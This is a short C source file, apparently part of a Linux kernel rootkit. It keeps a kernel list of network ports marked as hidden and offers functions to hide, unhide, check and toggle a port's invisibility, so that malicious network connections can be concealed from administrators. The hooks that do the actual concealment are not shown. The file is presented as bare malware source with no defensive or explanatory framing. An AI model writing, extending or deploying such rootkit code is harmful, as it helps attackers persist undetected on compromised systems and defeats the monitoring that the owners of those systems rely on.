#include "../inc/net.h"

void net_port_hide(unsigned int port) {
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;

    hp->port = port;
    list_add(&hp->list, &hidden_port_list);
}

void net_port_show(unsigned int port) {
    struct hidden_port *hp;

    list_for_each_entry (hp, &hidden_port_list, list) {
        if (hp->port == port) {
            list_del(&hp->list);
            kfree(hp);
            return;
        }
    }
}

int is_port_hidden(unsigned int port) {
    struct hidden_port *hp;

    list_for_each_entry (hp, &hidden_port_list, list)
        if (hp->port == port)
            return 1;

    return 0;
}

void toggle_port_invisability(unsigned int port) {
    if (is_port_hidden(port))
        net_port_show(port);
    else
        net_port_hide(port);
}
